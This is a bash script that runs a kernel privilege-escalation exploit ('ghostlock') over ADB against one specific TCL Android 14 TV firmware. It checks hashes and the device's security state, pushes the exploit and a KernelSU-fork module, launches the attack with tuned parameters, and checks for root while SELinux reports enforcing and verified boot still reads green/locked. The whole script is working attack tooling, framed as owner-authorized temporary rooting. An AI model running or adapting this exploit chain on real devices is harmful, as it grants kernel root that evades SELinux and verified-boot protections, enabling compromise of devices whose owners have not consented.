#!/bin/bash
set -euo pipefail

BUNDLE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
: "${ADB_TARGET:?Set ADB_TARGET to the owner-authorized TV serial, for example 192.0.2.10:5555}"
ADB=${ADB:-$(command -v adb)}
ADB_VENDOR_KEYS=${ADB_VENDOR_KEYS:-$HOME/.android/adbkey}
export ADB_VENDOR_KEYS

GHOST="$BUNDLE/ghostlock-tcl-v643"
HELPER="$BUNDLE/tcl-v643-mcast-helper"
HANDOFF="$BUNDLE/tcl-resukisu-handoff"
PREFLIGHT="$BUNDLE/tcl-resukisu-preflight"
KSUD="$BUNDLE/resukisu-ksud-armv7"
MODULE="$BUNDLE/resukisu-tcl-v643-5.15.180-android14-11.ko"
MANAGER_PACKAGE=com.philiphall6.resukisu.tcl

EXPECTED_GHOST=6529ef8f76bd6dda073850f5fe227b808bd05e1a1a90e13cff24d06bb1d91b91
EXPECTED_HELPER=4ca5692192b0a7598243f5070adf1e676ccd943aad4a292579ea69d38bbf1019
EXPECTED_HANDOFF=e519266c0a9774b63e48c8df7c813284073c320314121952bae18ecbfd5fd299
EXPECTED_PREFLIGHT=8ce8a4dc9dec167ce5e04858e3cd83c1a7a0ec35573d55010aae88234d43a7c0
EXPECTED_KSUD=528c80259613a1e27a90d8f202fda33ecceba9c1fd42e1d807fdbbc859af5e68
EXPECTED_MODULE=b6aeb907bd468852a11d7a90d121df87e1716f3b9549c69ee0190607e0d5f50c
EXPECTED_POLICY=1930f6750090c816a3ea8cc32f752e2eec9b9e6d10d2851fe001fd690b069819
EXPECTED_POLICY_SIZE=1030054

STAMP=$(date -u +%Y%m%dT%H%M%SZ)
LOG_DIR=${GHOSTLOCK_LOG_DIR:-$PWD/ghostlock-tcl-c855-$STAMP}
mkdir -p "$LOG_DIR"
exec > >(tee -a "$LOG_DIR/session.log") 2>&1

hash_is() {
  local expected=$1 path=$2 actual
  test -f "$path"
  actual=$(sha256sum "$path" | awk '{print $1}')
  if [ "$actual" != "$expected" ]; then
    printf 'REFUSED local hash mismatch: %s\n' "$path" >&2
    return 1
  fi
}

hash_is "$EXPECTED_GHOST" "$GHOST"
hash_is "$EXPECTED_HELPER" "$HELPER"
hash_is "$EXPECTED_HANDOFF" "$HANDOFF"
hash_is "$EXPECTED_PREFLIGHT" "$PREFLIGHT"
hash_is "$EXPECTED_KSUD" "$KSUD"
hash_is "$EXPECTED_MODULE" "$MODULE"

"$ADB" -s "$ADB_TARGET" get-state | grep -Fx device

state=$("$ADB" -s "$ADB_TARGET" shell '
  caps=$(for cap in network_peer_controls open_perms \
      extended_socket_class always_check_network cgroup_seclabel \
      nnp_nosuid_transition genfs_seclabel_symlinks ioctl_skip_cloexec; do
    cat "/sys/fs/selinux/policy_capabilities/$cap" 2>/dev/null || printf "?"
  done | tr -d "\r\n")
  printf "%s|%s|%s|%s|%s|%s|%s|%s|%s|%s" \
    "$(getprop ro.software.version_id)" "$(uname -r)" \
    "$(getprop ro.build.version.release)" "$(getprop sys.boot_completed)" \
    "$(getprop ro.boot.verifiedbootstate)" \
    "$(getprop ro.boot.vbmeta.device_state)" \
    "$(getprop ro.boot.veritymode)" "$(getenforce)" \
    "$(grep -Ec "^(kernelsu|resukisu|kowsu) " /proc/modules 2>/dev/null || true)" \
    "$caps"' | tr -d '\r')
expected_state='V8-T653T01-LF1V643|5.15.180-android14-11|14|1|green|locked|enforcing|Enforcing|0|11100100'
if [ "$state" != "$expected_state" ]; then
  printf 'REFUSED unexpected security/profile state:\n%s\n' "$state" >&2
  exit 3
fi

policy_identity=$("$ADB" -s "$ADB_TARGET" shell \
  'sha256sum /vendor/etc/selinux/precompiled_sepolicy; wc -c < /vendor/etc/selinux/precompiled_sepolicy' \
  | tr -d '\r')
policy_hash=$(printf '%s\n' "$policy_identity" | sed -n '1s/[[:space:]].*//p')
policy_size=$(printf '%s\n' "$policy_identity" | tail -n 1 | tr -d '[:space:]')
if [ "$policy_hash" != "$EXPECTED_POLICY" ] ||
   [ "$policy_size" != "$EXPECTED_POLICY_SIZE" ]; then
  printf 'REFUSED SELinux policy mismatch: hash=%s size=%s\n' \
    "$policy_hash" "$policy_size" >&2
  exit 3
fi

manager_path=$("$ADB" -s "$ADB_TARGET" shell "pm path '$MANAGER_PACKAGE'" \
  | tr -d '\r')
case "$manager_path" in
  package:/data/app/*) ;;
  *) printf 'REFUSED required manager is not installed: %s\n' \
       "$MANAGER_PACKAGE" >&2; exit 3 ;;
esac

uptime_raw=$("$ADB" -s "$ADB_TARGET" shell cat /proc/uptime \
  | tr -d '\r' | awk '{print $1}')
uptime_s=${uptime_raw%%.*}
case "$uptime_s" in
  ''|*[!0-9]*) printf 'REFUSED invalid uptime: %s\n' "$uptime_raw" >&2; exit 3 ;;
esac
if [ "$uptime_s" -gt 900 ]; then
  printf 'REFUSED boot is not fresh (uptime=%ss); reboot before one attempt.\n' \
    "$uptime_s" >&2
  exit 3
fi

boot_id=$("$ADB" -s "$ADB_TARGET" shell \
  cat /proc/sys/kernel/random/boot_id | tr -d '\r\n')
if ! printf '%s\n' "$boot_id" | grep -Eq \
  '^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$'; then
  printf 'REFUSED invalid boot identifier: %s\n' "$boot_id" >&2
  exit 3
fi

gate=/data/local/tmp/.tcl_newselect_broker_attempt_$boot_id
gate_result=$("$ADB" -s "$ADB_TARGET" shell \
  "if mkdir '$gate' 2>/dev/null; then echo ROOT_GATE_OK; else echo ROOT_GATE_EXISTS; fi" \
  | tr -d '\r')
if [ "$gate_result" != ROOT_GATE_OK ]; then
  printf 'REFUSED one-attempt-per-boot gate was already consumed.\n' >&2
  exit 4
fi

REMOTE=/data/local/tmp/tcl-v643-resukisu-lab
REMOTE_GHOST=$REMOTE/ghostlock-tcl-v643
REMOTE_HELPER=$REMOTE/tcl-v643-mcast-helper
REMOTE_HANDOFF=$REMOTE/tcl-resukisu-handoff
REMOTE_PREFLIGHT=$REMOTE/tcl-resukisu-preflight
REMOTE_KSUD=$REMOTE/resukisu-ksud-armv7
REMOTE_MODULE=$REMOTE/resukisu-tcl-v643.ko
STATUS=/data/local/tmp/.tcl_resukisu_handoff_$boot_id.status

"$ADB" -s "$ADB_TARGET" shell "mkdir -p '$REMOTE' && chmod 700 '$REMOTE'"
"$ADB" -s "$ADB_TARGET" push "$GHOST" "$REMOTE_GHOST"
"$ADB" -s "$ADB_TARGET" push "$HELPER" "$REMOTE_HELPER"
"$ADB" -s "$ADB_TARGET" push "$HANDOFF" "$REMOTE_HANDOFF"
"$ADB" -s "$ADB_TARGET" push "$PREFLIGHT" "$REMOTE_PREFLIGHT"
"$ADB" -s "$ADB_TARGET" push "$KSUD" "$REMOTE_KSUD"
"$ADB" -s "$ADB_TARGET" push "$MODULE" "$REMOTE_MODULE"
"$ADB" -s "$ADB_TARGET" shell \
  "chmod 700 '$REMOTE_GHOST' '$REMOTE_HELPER' '$REMOTE_HANDOFF' '$REMOTE_PREFLIGHT' '$REMOTE_KSUD'; chmod 600 '$REMOTE_MODULE'"

device_hashes=$("$ADB" -s "$ADB_TARGET" shell \
  "sha256sum '$REMOTE_GHOST' '$REMOTE_HELPER' '$REMOTE_HANDOFF' '$REMOTE_PREFLIGHT' '$REMOTE_KSUD' '$REMOTE_MODULE'" \
  | tr -d '\r')
printf '%s\n' "$device_hashes" | tee "$LOG_DIR/device-hashes.txt"
for pair in \
  "$EXPECTED_GHOST  $REMOTE_GHOST" \
  "$EXPECTED_HELPER  $REMOTE_HELPER" \
  "$EXPECTED_HANDOFF  $REMOTE_HANDOFF" \
  "$EXPECTED_PREFLIGHT  $REMOTE_PREFLIGHT" \
  "$EXPECTED_KSUD  $REMOTE_KSUD" \
  "$EXPECTED_MODULE  $REMOTE_MODULE"; do
  printf '%s\n' "$device_hashes" | grep -Fqx "$pair"
done

"$ADB" -s "$ADB_TARGET" shell "$REMOTE_HELPER --selftest" \
  | tee "$LOG_DIR/helper-selftest.log"
"$ADB" -s "$ADB_TARGET" shell "$REMOTE_GHOST --capture-witness-preflight" \
  | tee "$LOG_DIR/capture-preflight.log"

printf 'Starting the single volatile attempt; no flash, unlock, or partition write.\n'
set +e
"$ADB" -s "$ADB_TARGET" shell \
  "cd '$REMOTE' && timeout 200 env \
TCL_CAPTURE_FORCE_PERF=1 TCL_PERF_WITNESS=1 \
TCL_PERF_WITNESS_ATTEMPTS=5 TCL_PERF_RING_LOOPS=20000 \
TCL_W2_ATTEMPTS=1 TCL_REUSE_ATTEMPTS=1 \
TCL_MCAST_HELPER='$REMOTE_HELPER' \
TCL_RESUKISU_MANAGER_PACKAGE='$MANAGER_PACKAGE' \
GHOST_RESUKISU_HANDOFF='$REMOTE_HANDOFF' \
GHOST_RESUKISU_PREFLIGHT='$REMOTE_PREFLIGHT' \
GHOST_RESUKISU_KSUD='$REMOTE_KSUD' \
GHOST_RESUKISU_MODULE='$REMOTE_MODULE' \
GHOST_RESUKISU_STATUS='$STATUS' \
GHOST_SELINUX=1 GHOST_SELINUX_PRESERVE_INIT=1 \
GHOST_EXEC=1 GHOST_REBOOT=0 GHOST_MINIMAL=1 GHOST_SID_SCAN=0 \
FOPS_MAX_ATTEMPTS=3 CRED_ATTEMPTS=1 KSNITCH_VERBOSE=0 \
'$REMOTE_GHOST' --cred" 2>&1 | tee "$LOG_DIR/ghostlock.log"
exploit_rc=${PIPESTATUS[0]}
set -e
printf 'GhostLock ADB command rc=%d; reconnecting for final validation.\n' \
  "$exploit_rc"

connected=0
for _ in $(seq 1 60); do
  timeout 5 "$ADB" connect "$ADB_TARGET" >/dev/null 2>&1 || true
  if timeout 4 "$ADB" -s "$ADB_TARGET" get-state 2>/dev/null \
      | grep -Fqx device; then
    connected=1
    break
  fi
  sleep 2
done
if [ "$connected" -ne 1 ]; then
  printf 'BLOCKED: ADB did not return. No automatic reboot was requested.\n' >&2
  exit 6
fi

after_boot=$("$ADB" -s "$ADB_TARGET" shell \
  cat /proc/sys/kernel/random/boot_id | tr -d '\r\n')
if [ "$after_boot" != "$boot_id" ]; then
  printf 'FAILED: the kernel rebooted during the attempt.\n' >&2
  exit 7
fi

validation=$("$ADB" -s "$ADB_TARGET" shell "
  echo HANDOFF_STATUS_BEGIN
  cat '$STATUS' 2>/dev/null || echo state=UNAVAILABLE
  echo HANDOFF_STATUS_END
  caps=\$(for cap in network_peer_controls open_perms \
      extended_socket_class always_check_network cgroup_seclabel \
      nnp_nosuid_transition genfs_seclabel_symlinks ioctl_skip_cloexec; do
    cat \"/sys/fs/selinux/policy_capabilities/\$cap\" 2>/dev/null || printf '?'
  done | tr -d '\\r\\n')
  echo POLICYCAPS=\$caps
  echo SELINUX=\$(getenforce)
  echo AVB=\$(getprop ro.boot.verifiedbootstate)/\$(getprop ro.boot.vbmeta.device_state)
  '$REMOTE_KSUD' debug version 2>&1; echo KSUD_PROBE_RC=\$?
  su -c id 2>&1 || true
  echo ADB_POST=ok" | tr -d '\r')
printf '%s\n' "$validation" | tee "$LOG_DIR/final-validation.txt"

for marker in state=READY module=kernelsu mode=volatile late_load=ok \
  POLICYCAPS=11100100 SELINUX=Enforcing AVB=green/locked ADB_POST=ok; do
  printf '%s\n' "$validation" | grep -Fq "$marker"
done

sha256sum "$LOG_DIR"/*.log "$LOG_DIR"/*.txt > "$LOG_DIR/SHA256SUMS"
printf '%s\n' \
  'PASS: temporary TCL root and the required Philiphall6/ReSukiSU fork are active.' \
  'SELinux is enforcing, policy capabilities are restored, and AVB remains green/locked.' \
  'Root is volatile and disappears after a full TV reboot.'
